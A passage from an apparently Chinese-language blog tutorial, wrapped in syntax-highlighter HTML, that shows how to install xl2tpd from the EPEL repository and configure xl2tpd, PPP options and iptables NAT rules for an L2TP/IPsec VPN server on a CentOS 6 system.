<p><div id="crayon-5610cfe20b37b717325811-11" class="crayon-line"><span class="crayon-e">Pluto </span><span class="crayon-e">listening </span><span class="crayon-st">for</span> <span class="crayon-v">NAT</span><span class="crayon-o">-</span><span class="crayon-i">T</span> <span class="crayon-e">on </span><span class="crayon-i">udp</span> <span class="crayon-cn">4500</span><span class="crayon-h">                          </span><span class="crayon-sy">[</span><span class="crayon-v">OK</span><span class="crayon-sy">]</span></div></p>
<p><div id="crayon-5610cfe20b37b717325811-12" class="crayon-line crayon-striped-line"><span class="crayon-e">Two </span><span class="crayon-st">or</span> <span class="crayon-e">more </span><span class="crayon-e">interfaces </span><span class="crayon-v">found</span><span class="crayon-sy">,</span> <span class="crayon-e">checking </span><span class="crayon-e">IP </span><span class="crayon-i">forwarding</span><span class="crayon-h">            </span><span class="crayon-sy">[</span><span class="crayon-v">OK</span><span class="crayon-sy">]</span></div></p>
<p><div id="crayon-5610cfe20b37b717325811-13" class="crayon-line"><span class="crayon-e">Checking </span><span class="crayon-e">NAT </span><span class="crayon-st">and</span> <span class="crayon-i">MASQUERADEing</span><span class="crayon-h">                                  </span><span class="crayon-sy">[</span><span class="crayon-v">OK</span><span class="crayon-sy">]</span></div></p>
<p><div id="crayon-5610cfe20b37b717325811-14" class="crayon-line crayon-striped-line"><span class="crayon-e">Checking </span><span class="crayon-st">for</span> <span class="crayon-s">‘ip’</span> <span class="crayon-i">command</span><span class="crayon-h">                                       </span><span class="crayon-sy">[</span><span class="crayon-v">OK</span><span class="crayon-sy">]</span></div></p>
<p><div id="crayon-5610cfe20b37b717325811-15" class="crayon-line"><span class="crayon-v">Checking</span> <span class="crayon-o">/</span><span class="crayon-v">bin</span><span class="crayon-o">/</span><span class="crayon-e">sh </span><span class="crayon-st">is</span> <span class="crayon-st">not</span> <span class="crayon-o">/</span><span class="crayon-v">bin</span><span class="crayon-o">/</span><span class="crayon-i">dash</span><span class="crayon-h">                               </span><span class="crayon-sy">[</span><span class="crayon-v">OK</span><span class="crayon-sy">]</span></div></p>
<p><div id="crayon-5610cfe20b37b717325811-16" class="crayon-line crayon-striped-line"><span class="crayon-e">Checking </span><span class="crayon-st">for</span> <span class="crayon-s">‘iptables’</span> <span class="crayon-i">command</span><span class="crayon-h">                                 </span><span class="crayon-sy">[</span><span class="crayon-v">OK</span><span class="crayon-sy">]</span></div></p>
<p><div id="crayon-5610cfe20b37b717325811-17" class="crayon-line"><span class="crayon-e">Opportunistic </span><span class="crayon-e">Encryption </span><span class="crayon-i">Support</span><span class="crayon-h">                                </span><span class="crayon-sy">[</span><span class="crayon-v">DISABLED</span><span class="crayon-sy">]</span></div><br><br><br><br><br><br><br>安装x2ltpd</p>
<p><div id="crayon-5610cfe20b383717007724" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover"></div></p>
<p><div class="crayon-plain-wrap"></div></p>
<p><div class="crayon-main"></div></p>
<p><table class="crayon-table"></table></p>
<p><tbody></tbody></p>
<p><tr class="crayon-row"></tr></p>
<p><td class="crayon-nums " data-settings="show"></td></p>
<p><div class="crayon-nums-content"></div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b383717007724-1">1</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b383717007724-2">2</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b383717007724-3">3</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b383717007724-4">4</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b383717007724-5">5</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b383717007724-6">6</div><br></p>
<p><td class="crayon-code"></td></p>
<p><div class="crayon-pre"></div></p>
<p><div id="crayon-5610cfe20b383717007724-1" class="crayon-line"><span class="crayon-p"># yum install libpcap-devel</span></div></p>
<p><div id="crayon-5610cfe20b383717007724-2" class="crayon-line crayon-striped-line"><span class="crayon-p"># yum install ppp</span></div></p>
<p><div id="crayon-5610cfe20b383717007724-3" class="crayon-line">因为<span class="crayon-i">xl2tpd</span>在官方的源里没有，需要</div></p>
<p><div id="crayon-5610cfe20b383717007724-4" class="crayon-line crayon-striped-line"><span class="crayon-e">wget </span><span class="crayon-v">http</span><span class="crayon-o">:</span><span class="crayon-c">//mirrors.ustc.edu.cn/fedora/epel/6/i386/epel-release-6-8.noarch.rpm</span></div></p>
<p><div id="crayon-5610cfe20b383717007724-5" class="crayon-line"><span class="crayon-p"># rpm -Uvh epel-release-6-8.noarch.rpm</span></div></p>
<p><div id="crayon-5610cfe20b383717007724-6" class="crayon-line crayon-striped-line"><span class="crayon-p"># yum install xl2tpd</span></div><br><br><br><br><br><br></p>
<p><div id="crayon-5610cfe20b389002519202" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover"></div></p>
<p><div class="crayon-plain-wrap"></div></p>
<p><div class="crayon-main"></div></p>
<p><table class="crayon-table"></table></p>
<p><tbody></tbody></p>
<p><tr class="crayon-row"></tr></p>
<p><td class="crayon-nums " data-settings="show"></td></p>
<p><div class="crayon-nums-content"></div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b389002519202-1">1</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b389002519202-2">2</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b389002519202-3">3</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b389002519202-4">4</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b389002519202-5">5</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b389002519202-6">6</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b389002519202-7">7</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b389002519202-8">8</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b389002519202-9">9</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b389002519202-10">10</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b389002519202-11">11</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b389002519202-12">12</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b389002519202-13">13</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b389002519202-14">14</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b389002519202-15">15</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b389002519202-16">16</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b389002519202-17">17</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b389002519202-18">18</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b389002519202-19">19</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b389002519202-20">20</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b389002519202-21">21</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b389002519202-22">22</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b389002519202-23">23</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b389002519202-24">24</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b389002519202-25">25</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b389002519202-26">26</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b389002519202-27">27</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b389002519202-28">28</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b389002519202-29">29</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b389002519202-30">30</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b389002519202-31">31</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b389002519202-32">32</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b389002519202-33">33</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b389002519202-34">34</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b389002519202-35">35</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b389002519202-36">36</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b389002519202-37">37</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b389002519202-38">38</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b389002519202-39">39</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b389002519202-40">40</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b389002519202-41">41</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b389002519202-42">42</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b389002519202-43">43</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b389002519202-44">44</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b389002519202-45">45</div><br></p>
<p><td class="crayon-code"></td></p>
<p><div class="crayon-pre"></div></p>
<p><div id="crayon-5610cfe20b389002519202-1" class="crayon-line"><span class="crayon-p"># vi /etc/xl2tpd/xl2tpd.conf </span></div></p>
<p><div id="crayon-5610cfe20b389002519202-2" class="crayon-line crayon-striped-line"></div></p>
<p><div id="crayon-5610cfe20b389002519202-3" class="crayon-line"><span class="crayon-sy">;</span> <span class="crayon-r">This</span> <span class="crayon-st">is</span> <span class="crayon-i">a</span> <span class="crayon-e">minimal </span><span class="crayon-e">sample </span><span class="crayon-e">xl2tpd </span><span class="crayon-e">configuration </span><span class="crayon-e">file </span><span class="crayon-st">for</span> <span class="crayon-st">use</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-4" class="crayon-line crayon-striped-line"><span class="crayon-sy">;</span> <span class="crayon-e">with </span><span class="crayon-e">L2TP </span><span class="crayon-e">over </span><span class="crayon-v">IPsec</span><span class="crayon-sy">.</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-5" class="crayon-line"><span class="crayon-sy">;</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-6" class="crayon-line crayon-striped-line"><span class="crayon-sy">;</span> <span class="crayon-e">The </span><span class="crayon-e">idea </span><span class="crayon-st">is</span> <span class="crayon-st">to</span> <span class="crayon-e">provide </span><span class="crayon-e">an </span><span class="crayon-e">L2TP </span><span class="crayon-e">daemon </span><span class="crayon-st">to</span> <span class="crayon-e">which </span><span class="crayon-e">remote </span><span class="crayon-e">Windows </span><span class="crayon-v">L2TP</span><span class="crayon-o">/</span><span class="crayon-i">IPsec</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-7" class="crayon-line"><span class="crayon-sy">;</span> <span class="crayon-e">clients </span><span class="crayon-v">connect</span><span class="crayon-sy">.</span> <span class="crayon-st">In</span> <span class="crayon-r">this</span> <span class="crayon-v">example</span><span class="crayon-sy">,</span> <span class="crayon-e">the </span><span class="crayon-e">internal</span> <span class="crayon-sy">(</span><span class="crayon-m">protected</span><span class="crayon-sy">)</span> <span class="crayon-i">network</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-8" class="crayon-line crayon-striped-line"><span class="crayon-sy">;</span> <span class="crayon-st">is</span> <span class="crayon-cn">192.168.1.0</span><span class="crayon-o">/</span><span class="crayon-cn">24.</span><span class="crayon-h">  </span><span class="crayon-i">A</span> <span class="crayon-e">special </span><span class="crayon-e">IP </span><span class="crayon-e">range </span><span class="crayon-e">within </span><span class="crayon-r">this</span> <span class="crayon-e">network </span><span class="crayon-st">is</span> <span class="crayon-i">reserved</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-9" class="crayon-line"><span class="crayon-sy">;</span> <span class="crayon-st">for</span> <span class="crayon-e">the </span><span class="crayon-e">remote </span><span class="crayon-v">clients</span><span class="crayon-o">:</span> <span class="crayon-cn">192.168.1.128</span><span class="crayon-o">/</span><span class="crayon-cn">25</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-10" class="crayon-line crayon-striped-line"><span class="crayon-sy">;</span> <span class="crayon-sy">(</span><span class="crayon-v">i</span><span class="crayon-sy">.</span><span class="crayon-v">e</span><span class="crayon-sy">.</span> <span class="crayon-cn">192.168.1.128</span> <span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span> <span class="crayon-cn">192.168.1.254</span><span class="crayon-sy">)</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-11" class="crayon-line"><span class="crayon-sy">;</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-12" class="crayon-line crayon-striped-line"><span class="crayon-sy">;</span> <span class="crayon-e">The </span><span class="crayon-v">listen</span><span class="crayon-o">-</span><span class="crayon-e">addr </span><span class="crayon-e">parameter </span><span class="crayon-e">can </span><span class="crayon-e">be </span><span class="crayon-e">used </span><span class="crayon-st">if</span> <span class="crayon-e">you </span><span class="crayon-e">want </span><span class="crayon-st">to</span> <span class="crayon-e">bind </span><span class="crayon-e">the </span><span class="crayon-e">L2TP </span><span class="crayon-i">daemon</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-13" class="crayon-line"><span class="crayon-sy">;</span> <span class="crayon-st">to</span> <span class="crayon-i">a</span> <span class="crayon-e">specific </span><span class="crayon-e">IP </span><span class="crayon-e">address </span><span class="crayon-e">instead </span><span class="crayon-e">of </span><span class="crayon-st">to</span> <span class="crayon-e">all </span><span class="crayon-v">interfaces</span><span class="crayon-sy">.</span> <span class="crayon-st">For</span> <span class="crayon-v">instance</span><span class="crayon-sy">,</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-14" class="crayon-line crayon-striped-line"><span class="crayon-sy">;</span> <span class="crayon-e">you </span><span class="crayon-e">could </span><span class="crayon-e">bind </span><span class="crayon-e">it </span><span class="crayon-st">to</span> <span class="crayon-e">the </span><span class="crayon-t">interface</span> <span class="crayon-e">of </span><span class="crayon-e">the </span><span class="crayon-e">internal </span><span class="crayon-e">LAN</span> <span class="crayon-sy">(</span><span class="crayon-v">e</span><span class="crayon-sy">.</span><span class="crayon-v">g</span><span class="crayon-sy">.</span> <span class="crayon-cn">192.168.1.98</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-15" class="crayon-line"><span class="crayon-sy">;</span> <span class="crayon-st">in</span> <span class="crayon-e">the </span><span class="crayon-e">example </span><span class="crayon-v">below</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span> <span class="crayon-e">Yet </span><span class="crayon-e">another </span><span class="crayon-e">IP </span><span class="crayon-e">address</span> <span class="crayon-sy">(</span><span class="crayon-e">local </span><span class="crayon-v">ip</span><span class="crayon-sy">,</span> <span class="crayon-v">e</span><span class="crayon-sy">.</span><span class="crayon-v">g</span><span class="crayon-sy">.</span> <span class="crayon-cn">192.168.1.99</span><span class="crayon-sy">)</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-16" class="crayon-line crayon-striped-line"><span class="crayon-sy">;</span> <span class="crayon-e">will </span><span class="crayon-e">be </span><span class="crayon-e">used </span><span class="crayon-e">by </span><span class="crayon-e">xl2tpd </span><span class="crayon-st">as</span> <span class="crayon-e">its </span><span class="crayon-e">address </span><span class="crayon-e">on </span><span class="crayon-e">pppX </span><span class="crayon-v">interfaces</span><span class="crayon-sy">.</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-17" class="crayon-line"></div></p>
<p><div id="crayon-5610cfe20b389002519202-18" class="crayon-line crayon-striped-line"><span class="crayon-sy">;</span> <span class="crayon-v">IMPORTANT</span><span class="crayon-o">:</span> <span class="crayon-e">always </span><span class="crayon-e">set </span><span class="crayon-v">listen</span><span class="crayon-o">-</span><span class="crayon-e">addr </span><span class="crayon-st">to</span> <span class="crayon-i">a</span> <span class="crayon-e">specific </span><span class="crayon-v">address</span><span class="crayon-sy">,</span> <span class="crayon-st">to</span> <span class="crayon-e">work </span><span class="crayon-i">around</span> <span class="crayon-i">a</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-19" class="crayon-line"><span class="crayon-sy">;</span> <span class="crayon-e">udpfromto </span><span class="crayon-v">bug</span><span class="crayon-o">!</span><span class="crayon-o">!</span><span class="crayon-o">!</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-20" class="crayon-line crayon-striped-line"></div></p>
<p><div id="crayon-5610cfe20b389002519202-21" class="crayon-line"><span class="crayon-sy">[</span><span class="crayon-m">global</span><span class="crayon-sy">]</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-22" class="crayon-line crayon-striped-line"><span class="crayon-v">listen</span><span class="crayon-o">-</span><span class="crayon-v">addr</span> <span class="crayon-o">=</span><span class="crayon-v">vydbs</span><span class="crayon-sy">.</span><span class="crayon-i">com</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-23" class="crayon-line"><span class="crayon-sy">;</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-24" class="crayon-line crayon-striped-line"><span class="crayon-sy">;</span> <span class="crayon-e">requires </span><span class="crayon-v">openswan</span><span class="crayon-o">-</span><span class="crayon-cn">2.5.18</span> <span class="crayon-st">or</span> <span class="crayon-v">higher</span> <span class="crayon-o">-</span> <span class="crayon-e">Also </span><span class="crayon-e">does </span><span class="crayon-st">not</span> <span class="crayon-e">yet </span><span class="crayon-e">work </span><span class="crayon-st">in</span> <span class="crayon-i">combination</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-25" class="crayon-line"><span class="crayon-sy">;</span> <span class="crayon-e">with </span><span class="crayon-e">kernel </span><span class="crayon-e">mode </span><span class="crayon-e">l2tp </span><span class="crayon-st">as</span> <span class="crayon-e">present </span><span class="crayon-st">in</span> <span class="crayon-i">linux</span> <span class="crayon-cn">2.6.23</span><span class="crayon-o">+</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-26" class="crayon-line crayon-striped-line"><span class="crayon-e">ipsec </span><span class="crayon-v">saref</span> <span class="crayon-o">=</span> <span class="crayon-i">yes</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-27" class="crayon-line"><span class="crayon-sy">;</span> <span class="crayon-st">Use</span> <span class="crayon-e">refinfo </span><span class="crayon-i">of</span> <span class="crayon-cn">22</span> <span class="crayon-st">if</span> <span class="crayon-e">using </span><span class="crayon-e">an </span><span class="crayon-e">SAref </span><span class="crayon-e">kernel </span><span class="crayon-e">patch </span><span class="crayon-e">based </span><span class="crayon-e">on </span><span class="crayon-i">openswan</span> <span class="crayon-cn">2.6.35</span> <span class="crayon-st">or</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-28" class="crayon-line crayon-striped-line"><span class="crayon-sy">;</span><span class="crayon-h">  </span><span class="crayon-e">when </span><span class="crayon-e">using </span><span class="crayon-e">any </span><span class="crayon-e">of </span><span class="crayon-e">the </span><span class="crayon-e">SAref </span><span class="crayon-e">kernel </span><span class="crayon-e">patches </span><span class="crayon-st">for</span> <span class="crayon-e">kernels </span><span class="crayon-e">up </span><span class="crayon-st">to</span> <span class="crayon-cn">2.6.35.</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-29" class="crayon-line"><span class="crayon-sy">;</span> <span class="crayon-e">ipsec </span><span class="crayon-v">refinfo</span> <span class="crayon-o">=</span> <span class="crayon-cn">30</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-30" class="crayon-line crayon-striped-line"><span class="crayon-sy">;</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-31" class="crayon-line"><span class="crayon-sy">;</span> <span class="crayon-e">force </span><span class="crayon-v">userspace</span> <span class="crayon-o">=</span> <span class="crayon-i">yes</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-32" class="crayon-line crayon-striped-line"><span class="crayon-sy">;</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-33" class="crayon-line"><span class="crayon-sy">;</span> <span class="crayon-e">debug </span><span class="crayon-v">tunnel</span> <span class="crayon-o">=</span> <span class="crayon-i">yes</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-34" class="crayon-line crayon-striped-line"></div></p>
<p><div id="crayon-5610cfe20b389002519202-35" class="crayon-line"><span class="crayon-sy">[</span><span class="crayon-e">lns </span><span class="crayon-st">default</span><span class="crayon-sy">]</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-36" class="crayon-line crayon-striped-line"><span class="crayon-e">ip </span><span class="crayon-v">range</span> <span class="crayon-o">=</span> <span class="crayon-cn">192.168.1.128</span><span class="crayon-o">-</span><span class="crayon-cn">192.168.1.254</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-37" class="crayon-line"><span class="crayon-e">local </span><span class="crayon-v">ip</span> <span class="crayon-o">=</span> <span class="crayon-cn">192.168.1.99</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-38" class="crayon-line crayon-striped-line"><span class="crayon-sy">;</span> <span class="crayon-e">leave </span><span class="crayon-e">chap </span><span class="crayon-e">unspecified </span><span class="crayon-st">for</span> <span class="crayon-e">maximum </span><span class="crayon-e">compatibility </span><span class="crayon-e">with </span><span class="crayon-v">windows</span><span class="crayon-sy">,</span> <span class="crayon-v">iOS</span><span class="crayon-sy">,</span> <span class="crayon-i">etc</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-39" class="crayon-line"><span class="crayon-sy">;</span> <span class="crayon-e">require </span><span class="crayon-v">chap</span> <span class="crayon-o">=</span> <span class="crayon-e">yes</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-40" class="crayon-line crayon-striped-line"><span class="crayon-e">refuse </span><span class="crayon-v">pap</span> <span class="crayon-o">=</span> <span class="crayon-e">yes</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-41" class="crayon-line"><span class="crayon-e">require </span><span class="crayon-v">authentication</span> <span class="crayon-o">=</span> <span class="crayon-e">yes</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-42" class="crayon-line crayon-striped-line"><span class="crayon-v">name</span> <span class="crayon-o">=</span> <span class="crayon-e">LinuxVPNserver</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-43" class="crayon-line"><span class="crayon-e">ppp </span><span class="crayon-v">debug</span> <span class="crayon-o">=</span> <span class="crayon-e">yes</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-44" class="crayon-line crayon-striped-line"><span class="crayon-v">pppoptfile</span> <span class="crayon-o">=</span> <span class="crayon-o">/</span><span class="crayon-v">etc</span><span class="crayon-o">/</span><span class="crayon-v">ppp</span><span class="crayon-o">/</span><span class="crayon-v">options</span><span class="crayon-sy">.</span><span class="crayon-e">xl2tpd</span></div></p>
<p><div id="crayon-5610cfe20b389002519202-45" class="crayon-line"><span class="crayon-e">length </span><span class="crayon-v">bit</span> <span class="crayon-o">=</span> <span class="crayon-v">yes</span></div><br><br><br><br><br><br><br>修改/etc/ppp/options.xl2tpd</p>
<p><div id="crayon-5610cfe20b391513182426" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover"></div></p>
<p><div class="crayon-plain-wrap"></div></p>
<p><div class="crayon-main"></div></p>
<p><table class="crayon-table"></table></p>
<p><tbody></tbody></p>
<p><tr class="crayon-row"></tr></p>
<p><td class="crayon-nums " data-settings="show"></td></p>
<p><div class="crayon-nums-content"></div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b391513182426-1">1</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b391513182426-2">2</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b391513182426-3">3</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b391513182426-4">4</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b391513182426-5">5</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b391513182426-6">6</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b391513182426-7">7</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b391513182426-8">8</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b391513182426-9">9</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b391513182426-10">10</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b391513182426-11">11</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b391513182426-12">12</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b391513182426-13">13</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b391513182426-14">14</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b391513182426-15">15</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b391513182426-16">16</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b391513182426-17">17</div><br></p>
<p><td class="crayon-code"></td></p>
<p><div class="crayon-pre"></div></p>
<p><div id="crayon-5610cfe20b391513182426-1" class="crayon-line"><span class="crayon-p"># vi /etc/ppp/options.xl2tpd</span></div></p>
<p><div id="crayon-5610cfe20b391513182426-2" class="crayon-line crayon-striped-line"><span class="crayon-v">require</span><span class="crayon-o">-</span><span class="crayon-v">mschap</span><span class="crayon-o">-</span><span class="crayon-e">v2</span></div></p>
<p><div id="crayon-5610cfe20b391513182426-3" class="crayon-line"><span class="crayon-v">ipcp</span><span class="crayon-o">-</span><span class="crayon-v">accept</span><span class="crayon-o">-</span><span class="crayon-e">local</span></div></p>
<p><div id="crayon-5610cfe20b391513182426-4" class="crayon-line crayon-striped-line"><span class="crayon-v">ipcp</span><span class="crayon-o">-</span><span class="crayon-v">accept</span><span class="crayon-o">-</span><span class="crayon-e">remote</span></div></p>
<p><div id="crayon-5610cfe20b391513182426-5" class="crayon-line"><span class="crayon-v">ms</span><span class="crayon-o">-</span><span class="crayon-i">dns</span> <span class="crayon-cn">8.8.4.4</span></div></p>
<p><div id="crayon-5610cfe20b391513182426-6" class="crayon-line crayon-striped-line"><span class="crayon-v">ms</span><span class="crayon-o">-</span><span class="crayon-i">dns</span> <span class="crayon-cn">8.8.8.8</span></div></p>
<p><div id="crayon-5610cfe20b391513182426-7" class="crayon-line"><span class="crayon-e">noccp</span></div></p>
<p><div id="crayon-5610cfe20b391513182426-8" class="crayon-line crayon-striped-line"><span class="crayon-e">auth</span></div></p>
<p><div id="crayon-5610cfe20b391513182426-9" class="crayon-line"><span class="crayon-e">crtscts</span></div></p>
<p><div id="crayon-5610cfe20b391513182426-10" class="crayon-line crayon-striped-line"><span class="crayon-i">idle</span> <span class="crayon-cn">1800</span></div></p>
<p><div id="crayon-5610cfe20b391513182426-11" class="crayon-line"><span class="crayon-i">mtu</span> <span class="crayon-cn">1410</span></div></p>
<p><div id="crayon-5610cfe20b391513182426-12" class="crayon-line crayon-striped-line"><span class="crayon-i">mru</span> <span class="crayon-cn">1410</span></div></p>
<p><div id="crayon-5610cfe20b391513182426-13" class="crayon-line"><span class="crayon-e">nodefaultroute</span></div></p>
<p><div id="crayon-5610cfe20b391513182426-14" class="crayon-line crayon-striped-line"><span class="crayon-e">debug</span></div></p>
<p><div id="crayon-5610cfe20b391513182426-15" class="crayon-line"><span class="crayon-e">lock</span></div></p>
<p><div id="crayon-5610cfe20b391513182426-16" class="crayon-line crayon-striped-line"><span class="crayon-e">proxyarp</span></div></p>
<p><div id="crayon-5610cfe20b391513182426-17" class="crayon-line"><span class="crayon-v">connect</span><span class="crayon-o">-</span><span class="crayon-i">delay</span> <span class="crayon-cn">5000</span></div><br><br><br><br><br><br><br>iptables配置</p>
<p><div id="crayon-5610cfe20b397612733175" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover"></div></p>
<p><div class="crayon-plain-wrap"></div></p>
<p><div class="crayon-main"></div></p>
<p><table class="crayon-table"></table></p>
<p><tbody></tbody></p>
<p><tr class="crayon-row"></tr></p>
<p><td class="crayon-nums " data-settings="show"></td></p>
<p><div class="crayon-nums-content"></div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b397612733175-1">1</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b397612733175-2">2</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b397612733175-3">3</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b397612733175-4">4</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b397612733175-5">5</div><br></p>
<p><td class="crayon-code"></td></p>
<p><div class="crayon-pre"></div></p>
<p><div id="crayon-5610cfe20b397612733175-1" class="crayon-line"><span class="crayon-v">iptables</span> <span class="crayon-o">-</span><span class="crayon-i">t</span> <span class="crayon-v">nat</span> <span class="crayon-o">-</span><span class="crayon-i">A</span> <span class="crayon-v">POSTROUTING</span> <span class="crayon-o">-</span><span class="crayon-i">s</span> <span class="crayon-cn">192.168.1.0</span><span class="crayon-o">/</span><span class="crayon-cn">24</span> <span class="crayon-o">-</span><span class="crayon-i">o</span> <span class="crayon-v">eth0</span> <span class="crayon-o">-</span><span class="crayon-i">j</span> <span class="crayon-e">MASQUERADE</span></div></p>
<p><div id="crayon-5610cfe20b397612733175-2" class="crayon-line crayon-striped-line"><span class="crayon-v">iptables</span> <span class="crayon-o">-</span><span class="crayon-i">I</span> <span class="crayon-v">FORWARD</span> <span class="crayon-o">-</span><span class="crayon-i">s</span> <span class="crayon-cn">192.168.1.0</span><span class="crayon-o">/</span><span class="crayon-cn">24</span> <span class="crayon-o">-</span><span class="crayon-i">j</span> <span class="crayon-e">ACCEPT</span></div></p>
